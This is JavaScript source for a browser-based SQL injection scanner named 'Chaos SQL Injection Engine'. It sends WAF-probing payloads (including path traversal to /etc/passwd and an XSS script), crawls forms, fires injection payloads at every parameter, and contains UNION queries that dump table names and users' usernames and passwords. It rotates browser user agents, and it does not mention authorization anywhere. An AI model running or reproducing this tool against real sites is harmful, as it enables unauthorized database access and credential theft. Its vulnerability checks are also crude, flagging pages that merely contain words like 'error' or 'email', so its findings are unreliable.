// CHAOS SQL INJECTION ENGINE

class ChaosSQLEngine {
    constructor() {
        this.isScanning = false;
        this.results = [];
        this.requestCount = 0;
        this.vulnCount = 0;
        this.maxThreads = 10;
        this.delay = 100;
        this.userAgent = this.generateUserAgent();
        this.wafDetected = false;
        this.scanQueue = [];
        this.activeRequests = 0;
    }

    generateUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    async detectWAF(url) {
        const wafPayloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "' UNION SELECT 1,2,3--",
            "../../etc/passwd",
            "SELECT * FROM users"
        ];

        const wafSignatures = [
            'cloudflare', 'incapsula', 'sucuri', 'akamai',
            'f5', 'fortinet', 'barracuda', 'citrix',
            'mod_security', 'aws_waf', 'denied', 'blocked',
            'forbidden', 'access denied', 'security breach'
        ];

        for (const payload of wafPayloads) {
            try {
                const testUrl = new URL(url);
                testUrl.searchParams.set('test', payload);
                
                const response = await this.makeRequest(testUrl.toString(), 'GET', null, false);
                
                for (const signature of wafSignatures) {
                    if (response.text.toLowerCase().includes(signature.toLowerCase())) {
                        return { detected: true, type: signature };
                    }
                }
            } catch (e) {
                continue;
            }
        }
        
        return { detected: false, type: null };
    }

    async makeRequest(url, method = 'GET', data = null, log = true) {
        const headers = {
            'User-Agent': this.userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        };

        // Add custom headers if provided
        const customHeaders = document.getElementById('customHeaders').value;
        if (customHeaders) {
            try {
                const custom = JSON.parse(customHeaders);
                Object.assign(headers, custom);
            } catch (e) {
                this.log('Invalid custom headers JSON', 'error');
            }
        }

        const options = {
            method: method,
            headers: headers,
            mode: 'cors',
            cache: 'no-cache'
        };

        if (method === 'POST' && data) {
            options.body = new URLSearchParams(data);
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        try {
            const response = await fetch(url, options);
            const text = await response.text();
            
            if (log) {
                this.requestCount++;
                this.updateStats();
            }
            
            return {
                status: response.status,
                statusText: response.statusText,
                headers: Object.fromEntries(response.headers),
                text: text,
                url: url
            };
        } catch (error) {
            if (log) {
                this.log(`Request failed: ${error.message}`, 'error');
            }
            throw error;
        }
    }

    parseUrlParams(url) {
        try {
            const urlObj = new URL(url);
            const params = {};
            for (const [key, value] of urlObj.searchParams) {
                params[key] = value;
            }
            return params;
        } catch (e) {
            this.log('Invalid URL format', 'error');
            return {};
        }
    }

    async testPayload(url, param, payload, method = 'GET') {
        try {
            let testUrl, postData;
            
            if (method === 'GET') {
                const urlObj = new URL(url);
                urlObj.searchParams.set(param, payload);
                testUrl = urlObj.toString();
            } else {
                testUrl = url;
                postData = { [param]: payload };
            }

            const startTime = Date.now();
            const response = await this.makeRequest(testUrl, method, postData);
            const responseTime = Date.now() - startTime;

            const result = this.analyzeResponse(response, payload, responseTime);
            
            if (result.vulnerable) {
                this.vulnCount++;
                this.addVulnerability({
                    url: url,
                    parameter: param,
                    payload: payload,
                    type: result.type,
                    details: result.details,
                    response: response
                });
            }

            return result;
        } catch (error) {
            return { vulnerable: false, error: error.message };
        }
    }

    analyzeResponse(response, payload, responseTime) {
        const checks = {
            errorBased: this.checkErrorBased(response),
            unionBased: this.checkUnionBased(response),
            blindBased: this.checkBlindBased(response),
            timeBased: this.checkTimeBased(response, responseTime, payload)
        };

        for (const [type, result] of Object.entries(checks)) {
            if (result.vulnerable) {
                return { vulnerable: true, type: type, details: result.details };
            }
        }

        return { vulnerable: false };
    }

    checkErrorBased(response) {
        const errorPatterns = [
            /mysql_fetch_array|mysql_num_rows|mysql_error/i,
            /ORA-[0-9]{5}|Oracle error/i,
            /Microsoft OLE DB Provider|ODBC SQL Server Driver/i,
            /PostgreSQL.*ERROR|Warning.*pg_/i,
            /SQLite3::query\(\)|sqlite3.Error/i,
            /MySQLdb.Error|OperationalError/i,
            /Warning.*mysql_|Invalid query/i,
            /SQL syntax.*MySQL/i,
            /Warning.*\Wmysqli?_/i,
            /MySqlException/i,
            /valid MySQL result/i,
            /check the manual that corresponds to your MySQL server version/i
        ];

        for (const pattern of errorPatterns) {
            if (pattern.test(response.text)) {
                return {
                    vulnerable: true,
                    details: `Error pattern detected: ${pattern.source}`
                };
            }
        }

        return { vulnerable: false };
    }

    checkUnionBased(response) {
        const unionIndicators = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'];
        let count = 0;
        
        for (const indicator of unionIndicators) {
            if (response.text.includes(indicator)) {
                count++;
            }
        }

        if (count >= 3) {
            return {
                vulnerable: true,
                details: `Union indicators found: ${count}/10`
            };
        }

        // Check for common database info patterns
        const dbPatterns = [
            /\d+\.\d+\.\d+/,
            /mysql|mariadb|postgresql|oracle|microsoft/i,
            /database\(\)|user\(\)|version\(\)/i
        ];

        for (const pattern of dbPatterns) {
            if (pattern.test(response.text)) {
                return {
                    vulnerable: true,
                    details: `Database information leaked: ${pattern.source}`
                };
            }
        }

        return { vulnerable: false };
    }

    checkBlindBased(response) {
        // Check for content length differences or specific patterns
        const blindPatterns = [
            /admin|user|password|email/i,
            /login successful|welcome|dashboard/i,
            /error|invalid|failed/i
        ];

        for (const pattern of blindPatterns) {
            if (pattern.test(response.text)) {
                return {
                    vulnerable: true,
                    details: `Blind injection indicator: ${pattern.source}`
                };
            }
        }

        return { vulnerable: false };
    }

    checkTimeBased(response, responseTime, payload) {
        const timePayloads = ['SLEEP', 'WAITFOR', 'pg_sleep', 'delay'];
        const isTimePayload = timePayloads.some(p => payload.toUpperCase().includes(p));
        
        if (isTimePayload && responseTime > 4000) {
            return {
                vulnerable: true,
                details: `Time-based injection confirmed: ${responseTime}ms response time`
            };
        }

        return { vulnerable: false };
    }

    async crawlForms(url) {
        try {
            const response = await this.makeRequest(url, 'GET', null, false);
            const parser = new DOMParser();
            const doc = parser.parseFromString(response.text, 'text/html');
            
            const forms = [];
            const formElements = doc.querySelectorAll('form');
            
            formElements.forEach(form => {
                const action = form.getAttribute('action') || '';
                const method = (form.getAttribute('method') || 'GET').toUpperCase();
                const inputs = [];
                
                form.querySelectorAll('input, textarea, select').forEach(input => {
                    const name = input.getAttribute('name');
                    if (name) {
                        inputs.push({
                            name: name,
                            type: input.getAttribute('type') || 'text',
                            value: input.getAttribute('value') || ''
                        });
                    }
                });
                
                forms.push({
                    action: new URL(action, url).toString(),
                    method: method,
                    inputs: inputs
                });
            });
            
            return forms;
        } catch (error) {
            this.log(`Form crawling failed: ${error.message}`, 'error');
            return [];
        }
    }

    addVulnerability(vuln) {
        this.results.push(vuln);
        this.displayVulnerability(vuln);
    }

    displayVulnerability(vuln) {
        const container = document.getElementById('vulnResults');
        
        const vulnElement = document.createElement('div');
        vulnElement.className = 'vuln-item';
        vulnElement.innerHTML = `
            <div class="vuln-header">
                <span class="vuln-type">${vuln.type.toUpperCase()}</span>
                <span class="vuln-param">${vuln.parameter}</span>
            </div>
            <div class="vuln-url">${vuln.url}</div>
            <div class="vuln-details">
                <strong>Payload:</strong> <code>${this.escapeHtml(vuln.payload)}</code><br>
                <strong>Details:</strong> ${vuln.details}
            </div>
        `;
        
        container.insertBefore(vulnElement, container.firstChild);
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    async extractDatabaseInfo(url, param, method = 'GET') {
        const queries = {
            database: "' UNION SELECT 1,database(),3-- -",
            user: "' UNION SELECT 1,user(),3-- -",
            version: "' UNION SELECT 1,@@version,3-- -",
            tables: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
            columns: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -",
            data: "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -"
        };

        const results = {};
        
        for (const [key, query] of Object.entries(queries)) {
            try {
                const result = await this.testPayload(url, param, query, method);
                if (result.vulnerable) {
                    results[key] = 'Data extracted successfully';
                } else {
                    results[key] = 'Failed to extract';
                }
            } catch (error) {
                results[key] = `Error: ${error.message}`;
            }
        }
        
        return results;
    }

    log(message, type = 'info') {
        const logsContainer = document.getElementById('scanLogs');
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        
        const timestamp = new Date().toLocaleTimeString();
        logEntry.textContent = `[${timestamp}] ${message}`;
        
        logsContainer.appendChild(logEntry);
        logsContainer.scrollTop = logsContainer.scrollHeight;
    }

    updateStats() {
        document.getElementById('requestCount').textContent = this.requestCount;
        document.getElementById('vulnCount').textContent = this.vulnCount;
    }

    updateProgress(percent) {
        document.getElementById('progressFill').style.width = percent + '%';
        document.getElementById('progressText').textContent = Math.round(percent) + '%';
    }

    async startScan(targetUrl, options = {}) {
        if (this.isScanning) return;
        
        this.isScanning = true;
        this.results = [];
        this.requestCount = 0;
        this.vulnCount = 0;
        this.maxThreads = options.threads || 10;
        
        // Clear previous results
        document.getElementById('vulnResults').innerHTML = '';
        document.getElementById('scanLogs').innerHTML = '';
        
        this.log('Starting SQL injection scan...', 'info');
        
        try {
            // Detect WAF
            this.log('Detecting WAF...', 'info');
            const wafResult = await this.detectWAF(targetUrl);
            if (wafResult.detected) {
                this.wafDetected = true;
                this.log(`WAF detected: ${wafResult.type}`, 'warning');
            } else {
                this.log('No WAF detected', 'info');
            }
            
            // Crawl forms
            this.log('Crawling forms...', 'info');
            const forms = await this.crawlForms(targetUrl);
            this.log(`Found ${forms.length} forms`, 'info');
            
            // Get URL parameters
            const urlParams = this.parseUrlParams(targetUrl);
            this.log(`Found ${Object.keys(urlParams).length} URL parameters`, 'info');
            
            // Prepare scan queue
            this.scanQueue = [];
            
            // Add URL parameters to queue
            for (const param of Object.keys(urlParams)) {
                this.addPayloadsToQueue(targetUrl, param, 'GET', options);
            }
            
            // Add form parameters to queue
            for (const form of forms) {
                for (const input of form.inputs) {
                    this.addPayloadsToQueue(form.action, input.name, form.method, options);
                }
            }
            
            this.log(`Prepared ${this.scanQueue.length} tests`, 'info');
            
            // Start scanning with thread limit
            await this.processQueue();
            
            this.log('Scan completed!', 'info');
            this.log(`Found ${this.vulnCount} vulnerabilities`, 'success');
            
        } catch (error) {
            this.log(`Scan error: ${error.message}`, 'error');
        } finally {
            this.isScanning = false;
            this.updateProgress(100);
        }
    }

    addPayloadsToQueue(url, param, method, options) {
        const payloadTypes = [
            { type: 'union', enabled: options.unionPayload },
            { type: 'error', enabled: options.errorPayload },
            { type: 'blind', enabled: options.blindPayload },
            { type: 'time', enabled: options.timePayload }
        ];

        for (const { type, enabled } of payloadTypes) {
            if (enabled) {
                const payloads = PAYLOADS[type] || [];
                for (const payload of payloads) {
                    this.scanQueue.push({
                        url: url,
                        param: param,
                        payload: payload,
                        method: method
                    });
                }
            }
        }

        // Add custom payloads
        if (options.customPayload && options.customPayloads) {
            const customPayloads = options.customPayloads.split('\n').filter(p => p.trim());
            for (const payload of customPayloads) {
                this.scanQueue.push({
                    url: url,
                    param: param,
                    payload: payload.trim(),
                    method: method
                });
            }
        }
    }

    async processQueue() {
        const total = this.scanQueue.length;
        let processed = 0;
        
        const processItem = async (item) => {
            if (!this.isScanning) return;
            
            try {
                await this.testPayload(item.url, item.param, item.payload, item.method);
            } catch (error) {
                this.log(`Error testing ${item.param}: ${error.message}`, 'error');
            }
            
            processed++;
            const progress = (processed / total) * 100;
            this.updateProgress(progress);
        };

        // Process with thread limit
        const chunks = [];
        for (let i = 0; i < this.scanQueue.length; i += this.maxThreads) {
            chunks.push(this.scanQueue.slice(i, i + this.maxThreads));
        }

        for (const chunk of chunks) {
            if (!this.isScanning) break;
            
            await Promise.all(chunk.map(processItem));
            
            // Add delay between chunks
            if (this.delay > 0) {
                await new Promise(resolve => setTimeout(resolve, this.delay));
            }
        }
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
    }

    exportResults() {
        const report = {
            scanInfo: {
                timestamp: new Date().toISOString(),
                target: document.getElementById('targetUrl').value,
                totalRequests: this.requestCount,
                vulnerabilitiesFound: this.vulnCount,
                wafDetected: this.wafDetected
            },
            vulnerabilities: this.results,
            summary: {
                byType: this.getVulnSummaryByType(),
                byParameter: this.getVulnSummaryByParam()
            }
        };

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `chaos-sql-report-${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        
        this.log('Results exported successfully', 'info');
    }

    getVulnSummaryByType() {
        const summary = {};
        for (const vuln of this.results) {
            summary[vuln.type] = (summary[vuln.type] || 0) + 1;
        }
        return summary;
    }

    getVulnSummaryByParam() {
        const summary = {};
        for (const vuln of this.results) {
            summary[vuln.parameter] = (summary[vuln.parameter] || 0) + 1;
        }
        return summary;
    }
}

// Make engine available globally
window.ChaosSQLEngine = ChaosSQLEngine;
